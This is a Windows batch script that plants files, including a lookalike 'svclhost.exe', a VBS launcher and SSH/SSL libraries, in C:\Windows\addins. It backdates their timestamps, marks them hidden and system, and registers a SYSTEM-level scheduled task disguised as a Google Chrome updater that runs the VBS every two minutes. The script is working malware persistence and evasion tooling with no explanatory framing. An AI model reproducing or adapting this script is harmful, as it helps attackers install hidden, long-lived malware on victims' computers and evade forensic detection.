@echo off
cd "C:\Windows\addins"
copy /y "C:\Windows\Temp\libcrypto-3.dll" "C:\Windows\addins\libcrypto-3.dll"
copy /y "C:\Windows\Temp\libssh2.dll" "C:\Windows\addins\libssh2.dll"
copy /y "C:\Windows\Temp\libssl-3.dll" "C:\Windows\addins\libssl-3.dll"
copy /y "C:\Windows\Temp\svclhost.exe" "C:\Windows\addins\svclhost.exe"
copy /y "C:\Windows\Temp\svclhost.vbs" "C:\Windows\addins\svclhost.vbs"
set /P n_date=Enter Required Date (MM/DD/YYYY): 
set /P n_time=Enter Required Time (HH:MM:SS):  
if not defined n_date (set n_date= 11/11/2024)
if not defined n_time (set n_time= 18:41:10)

powershell -Command "Get-ChildItem -force C:\Windows\addins * | ForEach-Object{$_.LastWriteTime = ('%n_date% %n_time%');$_.CreationTime = ('%n_date% %n_time%');$_.LastAccessTime = ('%n_date% %n_time%')}"

attrib +h +s "C:\Windows\addins\svclhost.exe"
attrib +h +s "C:\Windows\addins\svclhost.vbs"
attrib +h +s "C:\Windows\addins\libcrypto-3.dll"
attrib +h +s "C:\Windows\addins\libssh2.dll"
attrib +h +s "C:\Windows\addins\libssl-3.dll"

SCHTASKS /CREATE /SC MINUTE /MO 2 /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader" /TR "C:\Windows\System32\WScript.exe //Nologo //B C:\Windows\addins\svclhost.vbs" /ST 18:20 /RU system /F

SCHTASKS /RUN /TN "GoogleSystem\GoogleUpdater\ChromeUpgrader"